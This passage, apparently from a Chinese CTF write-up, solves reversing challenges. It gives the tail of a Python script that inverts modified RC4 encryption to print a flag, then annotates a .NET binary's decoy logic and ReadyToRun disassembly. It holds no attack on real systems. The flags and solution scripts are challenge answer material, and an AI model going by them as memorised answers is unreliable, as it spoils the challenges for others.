class="hljs-number">0x75</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xF6</span>,<br>  <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x33</span>,<br>  <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xBD</span>,<br>  <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xE6</span>, <br>  <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x67</span>, <br>  <span class="hljs-number">0x36</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x48</span>, <br>  <span class="hljs-number">0x42</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x2A</span>, <br>  <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xB8</span>, <br>  <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x0F</span>, <br>  <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x85</span>, <br>  <span class="hljs-number">0x68</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x16</span>, <br>  <span class="hljs-number">0x92</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x88</span>, <br>  <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xCB</span>, <br>  <span class="hljs-number">0x06</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xB2</span>, <br>  <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x2B</span>, <br>  <span class="hljs-number">0x65</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xBF</span>, <br>  <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x88</span>, <br>  <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xFF</span>, <br>  <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x61</span>, <br>  <span class="hljs-number">0x95</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0xAB</span>, <br>  <span class="hljs-number">0x31</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x9F</span>, <br>  <span class="hljs-number">0x65</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0xDD</span>, <br>  <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0x99</span><br>]<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    cipher = <span class="hljs-built_in">bytearray</span>([<br>  <span class="hljs-number">0x78</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x0F</span>, <br>  <span class="hljs-number">0x29</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x66</span>, <br>  <span class="hljs-number">0x48</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x02</span>, <br>  <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xC8</span>, <br>  <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x0A</span>])<br>    <br>    key1 = <span class="hljs-string">b&quot;f75bf3e3f919&quot;</span> <br>    S1 = KSA(key1)<br>    tmp = <span class="hljs-built_in">bytearray</span>(data1)<br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(tmp)):<br>        out_byte, i, j = single_byte_PRGA(S1, i, j, <span class="hljs-number">0x47</span>)<br>        tmp[idx] ^= out_byte<br><br>    key2 = <span class="hljs-string">b&quot;363296f1-9353&quot;</span><br>    S2 = KSA(key2)<br><br>    cipher = dec_lastxor(cipher)<br><br>    xor_values = [<span class="hljs-number">0x25</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x47</span>]<br>    <span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cipher)):<br>        xor_val = xor_values[idx % <span class="hljs-number">3</span>]<br>        S2, cipher[idx] = one_byte_prga(S2, cipher[idx], xor_val)<br><br><span class="hljs-comment"># 逆向中途 input 与 tmp 的查表替换</span><br>    inv_tmp = [<span class="hljs-number">0</span>] * <span class="hljs-number">256</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        inv_tmp[tmp[i]] = i<br>    flag = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cipher)):<br>        flag.append(inv_tmp[cipher[i]])<br>        <br>    <span class="hljs-built_in">print</span>(flag.decode())<br></code></pre></td></tr></table></figure><p>flag 为 <code>flag&#123;2af4101a-201a-4ab9-a664-903577cb9ff0&#125;</code></p><h3 id="简单的逆向"><a href="#简单的逆向" class="headerlink" title="简单的逆向"></a>简单的逆向</h3><h4 id="虚假的逻辑"><a href="#虚假的逻辑" class="headerlink" title="虚假的逻辑"></a>虚假的逻辑</h4><p>dnSpy 打开先粗略翻了一下，看到了 RC4 相关加密，没找到密文，动态调试，断在入口点</p><p><img src="/../images/NPCCTF2025/j1.png"></p><p>直接跳转到 Main 的位置</p><p><img src="/../images/NPCCTF2025/j2.png"></p><p>有个很明显的假 flag<br>猜测这个 array2 里就存的密文<br>cipher &#x3D; [<br>  128, 120, 214, 255, 142, 235, 58, 98, 154, 204,<br>  10, 107, 117, 17, 192, 198, 61, 162, 218, 95,<br>  57, 177, 175, 62, 111, 6, 40, 178, 149, 231,<br>  163, 19, 36, 9, 249, 192, 94, 3, 236, 201,<br>  123, 203, 150, 98, 59, 141, 234, 117, 229, 108,<br>  135, 40, 105, 48, 89, 128, 11, 189, 35, 174,<br>  167, 13, 55, 220<br>]</p><p>动调的时候看到逻辑就是一个魔改的 RC4(PRGA 最后一步多了一个异或 0X100),密钥是 <code>17, 69, 20</code>，但是发现解不出来 flag</p><p>在 where 这里发现除了 rc4 之外还有两个函数</p><p><img src="/../images/NPCCTF2025/j3.png"></p><p>点进去查看分别是 AES(where.QZoPKLYRExWdGJMn) 和 DES(where.TYuNpWqDZfXoRJvB)</p><p><img src="/../images/NPCCTF2025/j4.png"></p><p><img src="/../images/NPCCTF2025/j4.1.png"></p><p><img src="/../images/NPCCTF2025/j5.png"></p><p><img src="/../images/NPCCTF2025/j5.1.png"></p><p>假 flag 在运行时交会打印 Right!,而在运行程序时提交却显示 Wrong!</p><p>在 Cor20 头里面看到 ManagedNativeHeader 地址 0968</p><p><img src="/../images/NPCCTF2025/j6.png"></p><p>在该地址处发现 RTR(ReadyToRun)</p><p><img src="/../images/NPCCTF2025/j7.png"></p><p>使用工具 R2RDump 分析附件里的 where.dll<br><code>R2RDump.exe --in &quot;D:\aaa\NPCCTF\简单的逆向\where.dll&quot; --disasm --naked --ho --out dump.txt</code></p><h4 id="真实的逻辑"><a href="#真实的逻辑" class="headerlink" title="真实的逻辑"></a>真实的逻辑</h4><p>找到 main 函数的全部逻辑 </p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">push</span>    <span class="hljs-built_in">r15</span><br>UWOP_PUSH_NONVOL <span class="hljs-built_in">R15</span>(<span class="hljs-number">15</span>)    <span class="hljs-number">0</span><br><br><span class="hljs-keyword">push</span>    <span class="hljs-built_in">r14</span><br>UWOP_PUSH_NONVOL <span class="hljs-built_in">R14</span>(<span class="hljs-number">14</span>)    <span class="hljs-number">0</span><br><br><span class="hljs-keyword">push</span>    <span class="hljs-built_in">r12</span><br>UWOP_PUSH_NONVOL <span class="hljs-built_in">R12</span>(<span class="hljs-number">12</span>)    <span class="hljs-number">0</span><br><br><span class="hljs-keyword">push</span>    <span class="hljs-built_in">rdi</span><br>UWOP_PUSH_NONVOL <span class="hljs-built_in">RDI</span>(<span class="hljs-number">7</span>)    <span class="hljs-number">0</span><br><br><span class="hljs-keyword">push</span>    <span class="hljs-built_in">rsi</span><br>UWOP_PUSH_NONVOL <span class="hljs-built_in">RSI</span>(<span class="hljs-number">6</span>)    <span class="hljs-number">0</span><br><br><span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbp</span><br>UWOP_PUSH_NONVOL <span class="hljs-built_in">RBP</span>(<span class="hljs-number">5</span>)    <span class="hljs-number">0</span><br><br><span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbx</span><br>UWOP_PUSH_NONVOL <span class="hljs-built_in">RBX</span>(<span class="hljs-number">3</span>)    <span class="hljs-number">0</span><br><br><span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">32</span><br>UWOP_ALLOC_SMALL <span class="hljs-number">32</span>    <span class="hljs-number">0</span><br><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-string">&quot;Input your flag:&quot;</span> (STRING_HANDLE)]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span>]<br><span class="hljs-built_in">RCX</span> is live<br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [void System<span class="hljs-number">.</span>Console<span class="hljs-number">.</span>Write(string) (METHOD_ENTRY)]<br><span class="hljs-built_in">RCX</span> is dead<br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [string System<span class="hljs-number">.</span>Console<span class="hljs-number">.</span>ReadLine() (METHOD_ENTRY)]<br><span class="hljs-built_in">RAX</span> is live<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-built_in">RSI</span> is live<br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [System<span class="hljs-number">.</span>Text<span class="hljs-number">.</span>Encoding System<span class="hljs-number">.</span>Text<span class="hljs-number">.</span>Encoding<span class="hljs-number">.</span>get_ASCII() (METHOD_ENTRY)]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-built_in">RCX</span> is live<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-built_in">RDX</span> is live<br><span class="hljs-keyword">lea</span>     <span class="hljs-built_in">r11</span>, [<span class="hljs-built_in">byte</span>[] System<span class="hljs-number">.</span>Text<span class="hljs-number">.</span>Encoding<span class="hljs-number">.</span>GetBytes(string) (VIRTUAL_ENTRY)]<br><span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span>], <span class="hljs-built_in">ecx</span><br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">byte</span>[] System<span class="hljs-number">.</span>Text<span class="hljs-number">.</span>Encoding<span class="hljs-number">.</span>GetBytes(string) (VIRTUAL_ENTRY)]<br><span class="hljs-built_in">RCX</span> is dead<br><span class="hljs-built_in">RDX</span> is dead<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-built_in">RCX</span> is live<br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">byte</span>[] where<span class="hljs-number">.</span>TYuNpWqDZfXoRJvB<span class="hljs-number">.</span>CZmLWpXqNKOVFRtJ(<span class="hljs-built_in">byte</span>[]) (METHOD_ENTRY)]  // DES<br><span class="hljs-built_in">RCX</span> is dead<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rax</span> // 将处理后的数据放到 <span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-number">8</span>]<br><span class="hljs-keyword">movsxd</span>  <span class="hljs-built_in">rcx</span>, <span class="hljs-built_in">ebx</span><br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">byte</span>[] (NEW_ARRAY)]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-built_in">RBP</span> is live<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r14d</span>, <span class="hljs-number">1</span> // 初始化 <span class="hljs-built_in">r14d</span> 为 <span class="hljs-number">1</span><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-number">3</span> // 创建长度为 <span class="hljs-number">3</span> 的新字节数组，结果在 <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">call</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">byte</span>[] (NEW_ARRAY)]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r15</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-built_in">R15</span> is live<br><span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-number">0x3928</span>]  // 从地址偏移 <span class="hljs-number">0x3928</span> 处加载数据<br><span class="hljs-built_in">RAX</span> is dead<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">dx</span>, <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span>]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r15</span> + <span class="hljs-number">16</span>], <span class="hljs-built_in">dx</span> // 先加载<span class="hljs-number">2</span>字节到<span class="hljs-built_in">dx</span>，存储到<span class="hljs-built_in">r15</span>数组的偏移<span class="hljs-number">16</span>处<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">dl</span>, <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">2</span>]<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">r15</span> + <span class="hljs-number">18</span>], <span class="hljs-built_in">dl</span> // 再加载<span class="hljs-number">1</span>字节到<span class="hljs-built_in">dl</span>，存储到偏移<span class="hljs-number">18</span>处 <br>                                //说明 <span class="hljs-built_in">r15</span> 是一个 <span class="hljs-number">3</span> 字节数组，在对应地址找到是 [<span class="hljs-number">0x72</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x72</span>] -&gt; <span 